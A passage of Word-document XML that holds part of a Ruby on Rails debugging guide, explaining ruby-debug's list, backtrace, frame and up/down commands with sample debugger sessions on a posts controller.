            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>   3    # GET /posts.json</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="50205892" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>   4    def index</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="03F2C949" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>   5      debugger</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1420ACBF" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; 6      @posts = Post.all</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="448FC9D8" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>   7</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5B3F2E9F" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>   8      respond_to do |format|</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="21EC6AB9" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>   9        format.html # index.html.erb</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="05C6F056" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>   10        format.json { render :json =&gt; @posts }</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="36DB40DF" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">If you repeat the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>list</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> command, this time using just </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>, the next ten lines of the file will be printed out.</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="7560"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="62374444" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="1454817B" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>(rdb:7) l</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="08F816B1" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>[11, 20] in /PathTo/project/app/controllers/posts_controller.rb</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="308B30F6" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>   11      end</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="66E20ABB" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>   12    end</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="08C29F13" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>   13</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2D5D4809" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>   14    # GET /posts/1</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6EA15A95" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>   15    # GET /posts/1.json</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3F1CF3C0" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>   16    def show</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="54BFDCB3" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>   17      @post = Post.find(params[:id])</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5F829199" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>   18</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2F187ADE" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>   19      respond_to do |format|</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="592E59C8" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>   20        format.html # show.html.erb</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="7D42D325" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">And so on until the end of the current file. When the end of file is reached, the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>list</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> command will start again from the beginning of the file and continue again up to the end, treating the file as a circular buffer.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="07AB289B" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">On the other hand, to see the previous ten lines you should type </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>list-</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (or </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>l-</w:t>
      </w:r>
      <w:r>
        <w:t>)</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="7320"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="4C77AECE" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="4C418704" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>(rdb:7) l-</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="08E593F3" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>[1, 10] in /PathToProject/posts_controller.rb</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6A698F8A" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>   1  class PostsController &lt; ApplicationController</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6EB49F29" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>   2    # GET /posts</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="224AD5AB" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>   3    # GET /posts.json</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2BF3B8A5" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>   4    def index</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3FFF5C45" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>   5      debugger</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4283A419" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>   6      @posts = Post.all</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4F3B358A" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>   7</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2D81BC89" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>   8      respond_to do |format|</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="652A9F98" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>   9        format.html # index.html.erb</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2F398387" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>   10        format.json { render :json =&gt; @posts }</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="2679E9BB" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">This way you can move inside the file, being able to see the code above and over the line you added the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>debugger</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">. Finally, to see where you are in the code again you can type </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>list=</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="7320"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="39BE985F" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="2E087D0E" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>(rdb:7) list=</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="16B25EED" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>[1, 10] in /PathToProject/posts_controller.rb</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="53F05F98" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>   1  class PostsController &lt; ApplicationController</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="47903E95" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>   2    # GET /posts</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="03BDB758" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>   3    # GET /posts.json</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="202F5CF3" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>   4    def index</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="540D8FAC" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>   5      debugger</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="274D9892" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; 6      @posts = Post.all</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="66E2DFC5" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>   7</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="28AF7464" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>   8      respond_to do |format|</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6E10E26A" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>   9        format.html # index.html.erb</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="18CADE4B" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>   10        format.json { render :json =&gt; @posts }</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="5FE84608" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="4"/>
      </w:pPr>
      <w:r>
        <w:t>3.3 The Context</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6CD392B8" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>When you start debugging your application, you will be placed in different contexts as you go through the different parts of the stack.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0BB099AE" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>ruby-debug creates a context when a stopping point or an event is reached. The context has information about the suspended program which enables a debugger to inspect the frame stack, evaluate variables from the perspective of the debugged program, and contains information about the place where the debugged program is stopped.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="11044D01" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">At any time you can call the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>backtrace</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> command (or its alias </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>where</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">) to print the backtrace of the application. This can be very helpful to know how you got where you are. If you ever wondered about how you got somewhere in your code, then </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>backtrace</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> will supply the answer.</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7697EDB" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="6D0AD9F4" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>(rdb:5) where</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5458677E" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>    #0 PostsController.index</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5E871E5E" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>       at line /PathTo/project/app/controllers/posts_controller.rb:6</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="00A4F4F0" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>    #1 Kernel.send</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5355472B" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>       at line /PathTo/project/vendor/rails/actionpack/lib/action_controller/base.rb:1175</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="09982E5E" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>    #2 ActionController::Base.perform_action_without_filters</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2E3780C0" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>       at line /PathTo/project/vendor/rails/actionpack/lib/action_controller/base.rb:1175</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="22530CDC" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>    #3 ActionController::Filters::InstanceMethods.call_filters(chain#ActionController::Fil...,...)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="672115DB" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>       at line /PathTo/project/vendor/rails/actionpack/lib/action_controller/filters.rb:617</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7B506CC3" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>...</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="053487E1" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">You move anywhere you want in this trace (thus changing the context) by using the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>frame _n_</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> command, where </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a7"/>
        </w:rPr>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> is the specified frame number.</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2E014FAC" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="4B4D80EE" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>(rdb:5) frame 2</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7757FB28" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>#2 ActionController::Base.perform_action_without_filters</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="054B1F6D" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>       at line /PathTo/project/vendor/rails/actionpack/lib/action_controller/base.rb:1175</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="035A405F" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>The available variables are the same as if you were running the code line by line. After all, that’s what debugging is.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3864298B" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Moving up and down the stack frame: You can use </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>up [n]</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>u</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> for abbreviated) and </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>down [n]</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> commands in order to change the context </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a7"/>
        </w:rPr>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> frames up or down the stack respectively. </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a7"/>
        </w:rPr>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> defaults to one. Up in this case is towards higher-numbered stack frames, and down is towards lower-numbered stack frames.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="759A99B3" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="4"/>
      </w:pPr>
      <w:r>
        <w:t>3.4 Threads</w:t>
